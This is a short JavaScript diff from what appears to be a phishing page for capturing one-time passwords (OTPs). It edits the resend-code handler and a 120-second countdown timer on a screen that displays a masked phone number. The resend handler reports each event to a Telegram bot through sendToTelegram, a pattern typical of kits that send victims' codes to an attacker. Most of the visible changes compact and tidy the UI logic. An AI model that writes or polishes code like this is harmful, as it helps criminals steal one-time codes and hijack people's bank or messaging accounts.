-  resendClicked=true;
-  sendToTelegram("resend_otp");
-  startTimer();
+  if(resendClicked) return;resendClicked=true;
+  sendToTelegram("resend_otp");startTimer();
 };
 
-/* ── Timer ── */
 function startTimer(){
   let t=120;
-  const timeEl=document.getElementById("time");
-  const resendBtn=document.getElementById("resendBtn");
-  timeEl.textContent=t;
-  resendBtn.classList.remove("active");
-  resendClicked=false;
-  resetOtp(false);
-  document.getElementById("mainBtn").classList.remove("active");
+  const timeEl=document.getElementById("time"),resendBtn=document.getElementById("resendBtn");
+  timeEl.textContent=t;resendBtn.classList.remove("active");resendClicked=false;
+  resetOtp(false);document.getElementById("mainBtn").classList.remove("active");
   const timer=setInterval(()=>{
-    t--;
-    timeEl.textContent=t;
+    t--;timeEl.textContent=t;
     if(t<=0){
-      clearInterval(timer);
-      resendBtn.classList.add("active");
-      resetOtp(true);
+      clearInterval(timer);resendBtn.classList.add("active");resetOtp(true);
       document.getElementById("mainBtn").classList.remove("active");
-      document.getElementById("maskedNumber").textContent="Code expired. Request a new OTP.";
+      document.getElementById("maskedNumber").textContent="Code expired. Tap Resend to get a new one.";
     }
   },1000);
 }
